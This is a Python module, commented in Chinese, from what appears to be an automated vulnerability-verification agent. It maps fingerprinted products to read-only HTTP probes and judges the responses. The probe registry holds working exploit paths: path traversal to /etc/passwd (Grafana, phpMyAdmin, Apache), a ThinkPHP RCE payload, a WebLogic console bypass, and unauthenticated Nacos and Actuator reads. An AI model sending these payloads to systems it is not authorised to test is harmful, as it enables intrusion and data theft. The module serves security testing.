"""指纹实测验证链（阶段：指纹→已知漏洞自动验证）。

把指纹工具（recon.fingerprint）命中的已知漏洞从「纯文本 verify 思路」升级为
「结构化可执行探针」，并自动生成验证计划块（verify_plan）拼进 worker 结果，
让 worker 能直接调 verify_known_vuln 实测该指纹的已知漏洞（如 Nacos 未授权、
Swagger 空访问、Actuator 泄露）。

两点设计纪律：
- 全纯逻辑、无网络、可单测：探针注册表 + 验证计划渲染 + 证据判定都是纯函数。
- 只放「只读 GET、命中特征明确、可复现」的探针；需要 AJP 端口/外部回调/危险
  破坏性 payload 的漏洞（Ghostcat/Log4j/Struts2/Fastjson 等）不给结构化探针，
  其 verify_plan 回落到 recon 的 verify 文本，由 worker 按思路自行判断。
"""
from __future__ import annotations

from typing import Any

_MAX_PROBES = 8
_SIGNAL_SNIPPET = 160


# ============ 结构化探针注册表（name 与 recon._KNOWN_VULNS["name"] 对齐） ============
# 每条 action：label / method / path / expect（大小写不敏感信号词）。
# 探针命中特征在「响应体 + 全部响应头值」里搜 expect，命中即视为信号。
_PROBES: dict[str, list[dict[str, Any]]] = {
    "Nacos 认证绕过": [
        {"label": "未授权列用户", "method": "GET", "path": "/nacos/v1/auth/users?pageNo=1&pageSize=9",
         "expect": ["username", "password", "accessToken", "totalCount"]},
        {"label": "未授权读配置", "method": "GET", "path": "/nacos/v1/cs/configs?dataId=&group=&tenant=",
         "expect": ["dataId", "content", "groupName"]},
    ],
    "Druid 监控未授权访问": [
        {"label": "监控页", "method": "GET", "path": "/druid/index.html",
         "expect": ["druidStatView", "druid", "web console"]},
        {"label": "监控 JSON", "method": "GET", "path": "/druid/basic.json",
         "expect": ["version", "druid", "startTime"]},
    ],
    "Swagger/API 文档未授权": [
        {"label": "swagger 面板", "method": "GET", "path": "/swagger-ui.html",
         "expect": ["swagger"]},
        {"label": "swagger-ui/index", "method": "GET", "path": "/swagger-ui/index.html",
         "expect": ["swagger"]},
        {"label": "v2 API 文档", "method": "GET", "path": "/v2/api-docs",
         "expect": ["swagger", "paths", "info"]},
        {"label": "v3 API 文档", "method": "GET", "path": "/v3/api-docs",
         "expect": ["openapi", "paths", "info"]},
    ],
    "Spring Boot Actuator 未授权访问": [
        {"label": "env 配置", "method": "GET", "path": "/actuator/env",
         "expect": ["propertySources", "spring", "settings"]},
        {"label": "mappings 路由", "method": "GET", "path": "/actuator/mappings",
         "expect": ["mappings", "contexts", "servlet"]},
        {"label": "health/beans", "method": "GET", "path": "/actuator/health",
         "expect": ["status", "UP", "DOWN"]},
    ],
    "Apache Shiro 反序列化（Shiro-550）": [
        # 特征在 Set-Cookie：Shiro 对任意请求返回 rememberMe=deleteMe。
        {"label": "rememberMe 标记", "method": "GET", "path": "/",
         "expect": ["rememberMe=deleteMe", "deleteMe"]},
    ],
    "Grafana 任意文件读取": [
        {"label": "路径穿越读 passwd", "method": "GET",
         "path": "/public/plugins/alertlist/../../../../../../../../etc/passwd",
         "expect": ["root:", "nobody:"]},
    ],
    "phpMyAdmin 本地文件包含": [
        {"label": "LFI 读 passwd", "method": "GET",
         "path": "/index.php?target=db_sql.php%3f/../../../../../../../../etc/passwd",
         "expect": ["root:"]},
    ],
    "Jenkins 未授权/脚本控制台": [
        {"label": "API JSON", "method": "GET", "path": "/api/json",
         "expect": ["hudson", "jenkins", "nodeDescription"]},
        {"label": "脚本控制台", "method": "GET", "path": "/script",
         "expect": ["script console", "jenkins", "groovy"]},
    ],
    "WebLogic 未授权远程代码执行": [
        {"label": "console 绕过", "method": "GET",
         "path": "/console/css/%252e%252e%252fconsole.portal",
         "expect": ["weblogic", "console.portal", "you have been signed in"]},
    ],
    "ThinkPHP 5.x 远程代码执行": [
        {"label": "RCE 回显 phpinfo", "method": "GET",
         "path": "/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
         "expect": ["phpinfo", "php version"]},
    ],
    "Apache HTTP Server 路径穿越 RCE": [
        {"label": "cgi 路径穿越", "method": "GET",
         "path": "/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd",
         "expect": ["root:"]},
        {"label": "非 cgi 路径穿越", "method": "GET",
         "path": "/icons/.%2e/%2e%2e/%2e%2e/etc/passwd",
         "expect": ["root:"]},
    ],
    "RuoYi 若依 定时任务/接口未授权": [
        {"label": "用户列表接口", "method": "GET", "path": "/prod-api/system/user/list",
         "expect": ["rows", "code", "total", "userName"]},
        {"label": "监控页", "method": "GET", "path": "/prod-api/druid/index.html",
         "expect": ["druid", "druidStatView"]},
    ],
    "Kibana 远程代码执行": [
        {"label": "Kibana 首页", "method": "GET", "path": "/app/kibana",
         "expect": ["kbn-injected-metadata", "kibana", "data-shared-item"]},
        {"label": "版本状态", "method": "GET", "path": "/api/status",
         "expect": ["version", "kbn", "cluster_uuid"]},
    ],
    "Coremail 配置信息泄露": [
        {"label": "Coremail 入口", "method": "GET", "path": "/coremail/common/index.jsp",
         "expect": ["coremail", "mail", "登录"]},
        {"label": "配置端点", "method": "GET", "path": "/coremail/static/",
         "expect": ["coremail", "static"]},
    ],
    "致远 A8 任意文件上传/未授权": [
        {"label": "htmlofficeservlet", "method": "GET", "path": "/seeyon/htmlofficeservlet",
         "expect": ["seeyon", "office", "htmlofficeservlet"]},
        {"label": "致远首页", "method": "GET", "path": "/seeyon/index.jsp",
         "expect": ["seeyon", "致远", "login"]},
    ],
    "泛微 e-cology SQL 注入/文件上传": [
        {"label": "泛微入口", "method": "GET", "path": "/weaver/baco/",
         "expect": ["weaver", "ecology", "e-cology"]},
        {"label": "认证接口", "method": "GET", "path": "/api/ec/dev/auth/applyOtherEntCode",
         "expect": ["ec", "weaver", "entCode"]},
    ],
    "通达 OA 任意文件上传/包含": [
        {"label": "ispirit 入口", "method": "GET", "path": "/ispirit/",
         "expect": ["通达", "ispirit", "oa"]},
        {"label": "gateway 端点", "method": "GET", "path": "/mac/gateway.php",
         "expect": ["gateway", "通达", "oa"]},
    ],
    "WordPress 插件/主题已知漏洞": [
        {"label": "用户枚举", "method": "GET", "path": "/wp-json/wp/v2/users",
         "expect": ["id", "name", "slug", "avatar_urls"]},
        {"label": "登录页", "method": "GET", "path": "/wp-login.php",
         "expect": ["wp-login", "wordpress", "log"]},
        {"label": "版本信息", "method": "GET", "path": "/wp-json/",
         "expect": ["wordpress", "routes", "namespace"]},
    ],
    "深信服 SSL VPN 未授权访问": [
        {"label": "VPN 配置", "method": "GET", "path": "/por/conf.csp",
         "expect": ["sangfor", "vpn", "conf"]},
        {"label": "VPN 首页", "method": "GET", "path": "/por/index.csp",
         "expect": ["sangfor", "vpn", "登录"]},
    ],
    "WebVPN 未授权/信息泄露": [
        {"label": "WebVPN 欢迎页", "method": "GET", "path": "/dana-na/auth/url_default/welcome.cgi",
         "expect": ["welcome", "dana", "vpn"]},
    ],
    "Elasticsearch 未授权访问": [
        {"label": "集群信息", "method": "GET", "path": "/",
         "expect": ["cluster_name", "version", "tagline", "lucene_version"]},
        {"label": "索引列表", "method": "GET", "path": "/_cat/indices?v",
         "expect": ["health", "index", "docs.count", "store.size"]},
        {"label": "集群健康", "method": "GET", "path": "/_cluster/health",
         "expect": ["cluster_name", "status", "number_of_nodes"]},
    ],
    "Apache Solr 远程代码执行": [
        {"label": "Solr 管理页", "method": "GET", "path": "/solr/admin/",
         "expect": ["solr", "solr-admin", "dashboard"]},
        {"label": "核心列表", "method": "GET", "path": "/solr/admin/cores?action=STATUS",
         "expect": ["status", "cores", "solr"]},
    ],
    "Zabbix 未授权访问": [
        {"label": "Zabbix 首页", "method": "GET", "path": "/zabbix/",
         "expect": ["zabbix", "login", "监控"]},
        {"label": "API 端点", "method": "GET", "path": "/api_jsonrpc.php",
         "expect": ["jsonrpc", "zabbix", "result"]},
    ],
}


def get_verify_actions(name: str) -> list[dict[str, Any]] | None:
    """按漏洞名取结构化探针；命中注册表返回探针列表，否则 None（回落到 verify 文本）。"""
    if not name:
        return None
    actions = _PROBES.get(name)
    if actions:
        return [dict(a) for a in actions][:_MAX_PROBES]
    # 宽松匹配：漏洞名与注册表键互相包含
    for key, acts in _PROBES.items():
        if key in name or name in key:
            return [dict(a) for a in acts][:_MAX_PROBES]
    return None


def has_structured_probes(name: str) -> bool:
    return bool(get_verify_actions(name))


# ============ 验证计划生成（纯渲染，不调用网络） ============
def render_verify_plan(known_vulns: list[dict[str, Any]]) -> str:
    """把 fingerprint 命中的 known_vulns 渲染成可执行验证块（空列表返回空串）。

    每个命中漏洞给出实测方式：有结构化探针 → 提示调 verify_known_vuln 一键实测；
    无探针 → 回落给 verify 文本思路。此块由 fingerprint 工具自动拼进结果，worker
    看到即按块实测。
    """
    items = [v for v in (known_vulns or []) if isinstance(v, dict) and v.get("name")]
    if not items:
        return ""
    lines = [
        "# 指纹已知漏洞实测链（命中即优先按下列探针最小实证；探针只读探测，命中≠漏洞，按实际危害再判断）"
    ]
    for v in items:
        name = v["name"]
        risk = v.get("risk", "")
        actions = get_verify_actions(name)
        if not actions:
            verify = (v.get("verify") or "").strip()
            lines.append(
                f"- {name}[{risk or '未知'}]：无内置探针，按以下思路用 http_request 实证➜ {verify}"
            )
            continue
        lines.append(f"- {name}[{risk or '未知'}]：调 verify_known_vuln(url=\"{name}\") 一键实测（已内置 {len(actions)} 条只读探针）：")
        for a in actions:
            expect = " / ".join(a.get("expect", [])[:3]) or "（状态码 2xx）"
            pairs = []
            for k in ("label",):
                if a.get(k):
                    pairs.append(a[k])
            if a.get("path"):
                pairs.append(a["path"])
            lines.append(f"    · {a.get('method', 'GET')} {a['path']}  → 期望出现「{expect}」")
    lines.append(
        "注意：探针命中只代表该组件/端点暴露且版本疑似受影响；是否构成可交漏洞还需按"
        "风险等级确认实际危害（如读取到真实配置/数据），实证成功才 submit_finding。"
    )
    return "\n".join(lines) + "\n"


# ============ 探针请求构造（纯 URL 拼接） ============
def build_probe_request(base_url: str, action: dict[str, Any]) -> dict[str, Any]:
    """把一条探针 action 拼成可执行请求。base_url 为 scheme://host[:port]，不含路径。

    返回 {method, url}（当前探针全部只读 GET，无 body，纯干净）。
    """
    base = (base_url or "").rstrip("/")
    path = action.get("path") or ""
    if not path.startswith("/"):
        path = "/" + path
    method = (action.get("method") or "GET").upper()
    return {"method": method, "url": base + path}


# ============ 证据判定（纯逻辑，可单测） ============
def _hit_signal(expect: list[str], blob: str) -> bool:
    low = (blob or "").lower()
    return any(k and k.lower() in low for k in (expect or []))


def mark_action_result(
    action: dict[str, Any], status: int, body: str, response_headers: dict[str, Any]
) -> dict[str, Any]:
    """把单条探针的响应归成带 signal/命中判定的结果条目（纯函数）。"""
    status = int(status or 0)
    blob = (body or "")
    blob += " " + " ".join(str(k) for k, v in (response_headers or {}).items())
    blob += " " + " ".join(str(v) for k, v in (response_headers or {}).items())
    expect = action.get("expect", []) or []
    signal = _hit_signal(expect, blob)
    status_hit = 200 <= status < 400
    hit = bool(signal and status_hit)
    snippet = ""
    low_body = (body or "").lower()
    for k in expect:
        if k and k.lower() in low_body:
            idx = low_body.find(k.lower())
            snippet = (body or "")[max(0, idx - 60): idx + _SIGNAL_SNIPPET].replace("\n", " ")
            break
    return {
        "label": action.get("label") or action.get("path", ""),
        "method": action.get("method", "GET"),
        "path": action.get("path", ""),
        "status": status,
        "signal": bool(signal),
        "hit": hit,
        "snippet": snippet[:_SIGNAL_SNIPPET + 60],
    }


def summarize_evidence(results: list[dict[str, Any]]) -> dict[str, Any]:
    """聚合多条探针结果给总体判定（纯逻辑）。"""
    hits = [r for r in results if r.get("hit")]
    reachable = [r for r in results if 200 <= int(r.get("status") or 0) < 400]
    total = len(results)
    if hits:
        verdict = "likely"
        hits_detail = "、".join(r.get("label", "") for r in hits[:5])
        detail = f"{len(hits)}/{total} 条命中特征：{hits_detail}。系统大概率存在该已知漏洞组件暴露，按风险确认实际危害后可提交。"
    elif reachable:
        verdict = "endpoint_exposed"
        reach = [r.get("label", "") for r in reachable[:5]]
        detail = (
            f"{len(reachable)}/{total} 条端点可达(2xx)但未见漏洞特征，可能版本已修复或特征被改写；"
            f"仍建议用 http_request 人工核对（如打开 {reach}）。"
        )
    else:
        verdict = "negative"
        detail = f"{total} 条探针均未命中(无 2xx 或未出现特征)，暂未发现该已知漏洞迹象；可结合手动核对版本再定。"
    return {"verdict": verdict, "summary": detail}